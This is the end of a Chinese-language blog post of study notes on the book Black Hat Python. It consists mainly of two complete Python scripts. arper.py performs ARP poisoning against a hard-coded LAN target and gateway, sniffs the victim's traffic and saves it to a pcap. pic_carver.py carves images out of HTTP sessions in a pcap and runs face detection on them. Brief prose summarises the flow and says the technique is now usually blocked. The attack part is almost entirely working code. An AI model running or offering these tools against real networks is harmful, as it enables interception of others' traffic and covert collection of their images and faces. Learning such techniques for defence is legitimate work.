class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> kamene.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">interface = <span class="string">&quot;en1&quot;</span></span><br><span class="line">tgt_ip = <span class="string">&quot;172.16.1.71&quot;</span></span><br><span class="line">tgt_gateway = <span class="string">&quot;172.16.1.254&quot;</span></span><br><span class="line">packet_count = <span class="number">1000</span></span><br><span class="line">poisoning = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_target</span>(<span class="params">gateway_ip, gateway_mac, target_ip, target_mac</span>):</span></span><br><span class="line">    <span class="comment"># slightly different method using send</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Restoring target...&quot;</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>,</span><br><span class="line">             psrc=gateway_ip,</span><br><span class="line">             pdst=target_ip,</span><br><span class="line">             hwdst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>,</span><br><span class="line">             hwsrc=gateway_mac),</span><br><span class="line">         count=<span class="number">5</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>,</span><br><span class="line">             psrc=target_ip,</span><br><span class="line">             pdst=gateway_ip,</span><br><span class="line">             hwdst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>,</span><br><span class="line">             hwsrc=target_mac),</span><br><span class="line">         count=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span>(<span class="params">ip_address</span>):</span></span><br><span class="line">    responses, unanswered = srp(</span><br><span class="line">        Ether(dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>) / ARP(pdst=ip_address),</span><br><span class="line">        timeout=<span class="number">2</span>,</span><br><span class="line">        retry=<span class="number">10</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># return the MAC address from a response</span></span><br><span class="line">    <span class="keyword">for</span> s, r <span class="keyword">in</span> responses:</span><br><span class="line">        <span class="keyword">return</span> r[Ether].src</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target</span>(<span class="params">gateway_ip, gateway_mac, target_ip, target_mac</span>):</span></span><br><span class="line">    <span class="keyword">global</span> poisoning</span><br><span class="line"></span><br><span class="line">    poison_tgt = ARP()</span><br><span class="line">    poison_tgt.op = <span class="number">2</span></span><br><span class="line">    poison_tgt.psrc = gateway_ip</span><br><span class="line">    poison_tgt.pdst = target_ip</span><br><span class="line">    poison_tgt.hwdst = target_mac</span><br><span class="line"></span><br><span class="line">    poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = target_ip</span><br><span class="line">    poison_gateway.pdst = gateway_ip</span><br><span class="line">    poison_gateway.hwdst = gateway_mac</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Beginning the ARP poison. [CTRL-C to stop]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> poisoning:</span><br><span class="line">        send(poison_tgt)</span><br><span class="line">        send(poison_gateway)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] ARP poison attack finished.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set our interface</span></span><br><span class="line">conf.iface = interface</span><br><span class="line"></span><br><span class="line"><span class="comment"># turn off output</span></span><br><span class="line">conf.verb = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Setting up %s&quot;</span> % interface)</span><br><span class="line"></span><br><span class="line">tgt_gateway_mac = get_mac(tgt_gateway)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tgt_gateway_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!!!] Failed to get gateway MAC. Exiting.&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Gateway %s is at %s&quot;</span> % (tgt_gateway, tgt_gateway_mac))</span><br><span class="line"></span><br><span class="line">tgt_mac = get_mac(tgt_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tgt_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!!!] Failed to get target MAC. Exiting.&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Target %s is at %s&quot;</span> % (tgt_ip, tgt_mac))</span><br><span class="line"></span><br><span class="line"><span class="comment"># start poison thread</span></span><br><span class="line">poison_thread = threading.Thread(target=poison_target,</span><br><span class="line">                                 args=(tgt_gateway,</span><br><span class="line">                                       tgt_gateway_mac,</span><br><span class="line">                                       tgt_ip,</span><br><span class="line">                                       tgt_mac)</span><br><span class="line">                                 )</span><br><span class="line">poison_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Starting sniffer for %d packets&quot;</span> % packet_count)</span><br><span class="line">    bpf_filter = <span class="string">&quot;ip host %s&quot;</span> % tgt_ip</span><br><span class="line">    packets = sniff(count=packet_count,</span><br><span class="line">                    <span class="built_in">filter</span>=bpf_filter,</span><br><span class="line">                    iface=interface</span><br><span class="line">                    )</span><br><span class="line">    <span class="comment"># write out the captured packets</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Writing packets to arper.pcap&quot;</span>)</span><br><span class="line">    wrpcap(<span class="string">&#x27;arper.pcap&#x27;</span>, packets)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    poisoning = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># wait for poisoning thread to exit</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># restore the network</span></span><br><span class="line">    restore_target(tgt_gateway,</span><br><span class="line">                   tgt_gateway_mac,</span><br><span class="line">                   tgt_ip,</span><br><span class="line">                   tgt_mac</span><br><span class="line">                   )</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>這裡是做arp汙染，把gateway的eth addr用成自己的<br>
這樣就能上面的sniffer來看封包</p>
<p>手法是一直發假的arp這樣只要有機器吃到，就會把封包丟到這裡<br>
但現在這個手法都行不通拉 都會被擋</p>
<hr>
<p>還有一個是讀pcap來找出圖片，同時對圖片作人臉辨識<br>
pic_carver.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> kamene.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pictures_directory = <span class="string">&quot;pic_carver/pictures&quot;</span></span><br><span class="line">faces_directory = <span class="string">&quot;pic_carver/faces&quot;</span></span><br><span class="line">pcap_file = <span class="string">&quot;bhp.pcap&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">face_detect</span>(<span class="params">path, file_name</span>):</span></span><br><span class="line">    img = cv2.imread(path)</span><br><span class="line">    cascade = cv2.CascadeClassifier(<span class="string">&quot;haarcascade_frontalface_alt.xml&quot;</span>)</span><br><span class="line">    rects = cascade.detectMultiScale(img, <span class="number">1.3</span>, <span class="number">4</span>,</span><br><span class="line">                                     cv2.CASCADE_SCALE_IMAGE, (<span class="number">20</span>, <span class="number">20</span>)</span><br><span class="line">                                     )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rects) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    rects[:, <span class="number">2</span>:] += rects[:, :<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># highlight the faces in the image</span></span><br><span class="line">    <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> rects:</span><br><span class="line">        cv2.rectangle(img, (x1, y1), (x2, y2), (<span class="number">127</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">    cv2.imwrite(<span class="string">&quot;%s/%s-%s&quot;</span> % (faces_directory, pcap_file, file_name), img)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_http_headers</span>(<span class="params">http_payload</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># split the headers off if it is HTTP traffic</span></span><br><span class="line">        headers_raw = http_payload[:http_payload.index(<span class="string">&quot;\r\n\r\n&quot;</span>) + <span class="number">2</span>]</span><br><span class="line">        <span class="comment"># break out the headers</span></span><br><span class="line">        headers = <span class="built_in">dict</span>(</span><br><span class="line">            re.findall(<span class="string">r&quot;(?P&lt;name&gt;.*?): (?P&lt;value&gt;.*?)\r\n&quot;</span>, headers_raw))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Content-Type&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_image</span>(<span class="params">headers, http_payload</span>):</span></span><br><span class="line">    image = <span class="literal">None</span></span><br><span class="line">    image_type = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;image&quot;</span> <span class="keyword">in</span> headers[<span class="string">&#x27;Content-Type&#x27;</span>]:</span><br><span class="line">            <span class="comment"># grab the image type and image body</span></span><br><span class="line">            image_type = headers[<span class="string">&#x27;Content-Type&#x27;</span>].split(<span class="string">&quot;/&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            image = http_payload[http_payload.index(<span class="string">&quot;\r\n\r\n&quot;</span>) + <span class="number">4</span>:]</span><br><span class="line">            <span class="comment"># if we detect compression decompress the image</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;Content-Encoding&quot;</span> <span class="keyword">in</span> <span class="built_in">list</span>(headers.keys()):</span><br><span class="line">                    <span class="keyword">if</span> headers[<span class="string">&#x27;Content-Encoding&#x27;</span>] == <span class="string">&quot;gzip&quot;</span>:</span><br><span class="line">                        image = zlib.decompress(image, <span class="number">16</span> + zlib.MAX_WBITS)</span><br><span class="line">                    <span class="keyword">elif</span> headers[<span class="string">&#x27;Content-Encoding&#x27;</span>] == <span class="string">&quot;deflate&quot;</span>:</span><br><span class="line">                        image = zlib.decompress(image)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> image, image_type</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_assembler</span>(<span class="params">pcap_fl</span>):</span></span><br><span class="line">    carved_images = <span class="number">0</span></span><br><span class="line">    faces_detected = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    a = rdpcap(pcap_fl)</span><br><span class="line">    sessions = a.sessions()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> session <span class="keyword">in</span> sessions:</span><br><span class="line">        http_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> sessions[session]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> packet[TCP].dport == <span class="number">80</span> <span class="keyword">or</span> packet[TCP].sport == <span class="number">80</span>:</span><br><span class="line">                    <span class="comment"># reassemble the stream into a single buffer</span></span><br><span class="line">                    http_payload += <span class="built_in">str</span>(packet[TCP].payload)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        headers = get_http_headers(http_payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> headers <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        image, image_type = extract_image(headers, http_payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> image <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> image_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># store the image</span></span><br><span class="line">            file_name = <span class="string">&quot;%s-pic_carver_%d.%s&quot;</span> % (</span><br><span class="line">                pcap_fl, carved_images, image_type)</span><br><span class="line">            fd = <span class="built_in">open</span>(<span class="string">&quot;%s/%s&quot;</span> % (pictures_directory, file_name), <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">            fd.write(image)</span><br><span class="line">            fd.close()</span><br><span class="line">            carved_images += <span class="number">1</span></span><br><span class="line">            <span class="comment"># now attempt face detection</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = face_detect(<span class="string">&quot;%s/%s&quot;</span> % (pictures_directory, file_name),</span><br><span class="line">                                     file_name)</span><br><span class="line">                <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                    faces_detected += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> carved_images, faces_detected</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">carved_img, faces_dtct = http_assembler(pcap_file)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Extracted: %d images&quot;</span> % carved_images)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Detected: %d faces&quot;</span> % faces_detected)</span><br></pre></td></tr></table></figure>
<p>整個流程是</p>
<ol>
<li>把封包導向自己 (<span class="exturl" data-url="aHR0cDovL2FycGVyLnB5">arper.py<i class="fa fa-external-link-alt"></i></span>)</li>
<li>sniff出需要的封包，存成pcap (mail_sniffer.py，雖然沒有存成pcap的部分)</li>
<li>對pcap做分析(pic_carver.py)</li>
</ol>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/8/nginx-first-note/" rel="prev" title="nginx的簡單survey">
      <i class="fa fa-chevron-left"></i> nginx的簡單survey
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/9/python-black-hat-web/" rel="next" title="blackhat python - web">
      blackhat python - web <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8B%95%E6%A9%9F-660"><span class="nav-number">1.</span> <span class="nav-text">動機</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%92%B0%E5%A2%83-py3"><span class="nav-number">2.</span> <span class="nav-text">環境 &amp; py3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CH2"><span class="nav-number">3.</span> <span class="nav-text">CH2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84TCP-client-server"><span class="nav-number">3.1.</span> <span class="nav-text">基本的TCP client&amp;server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#paramiko-%E7%94%A8python%E6%93%8D%E4%BD%9CSSH"><span class="nav-number">3.2.</span> <span class="nav-text">paramiko: 用python操作SSH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B8%BD%E8%A4%87%E7%BF%92-Netcat-Replacement"><span class="nav-number">3.3.</span> <span class="nav-text">總複習: Netcat Replacement</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CH3"><span class="nav-number">4.</span> <span class="nav-text">CH3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CH4"><span class="nav-number">5.</span> <span class="nav-text">CH4</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">zhengcf</p>
  <div class="site-description" itemprop="description">想到什麼就寫什麼</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">687</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">79</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">64</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zhengcf</span>
</div>
  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 1000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'https://littlebees.github.io/2020/9/python-black-hat-np/',]
      });
      });
  </script>

</body>
</html>
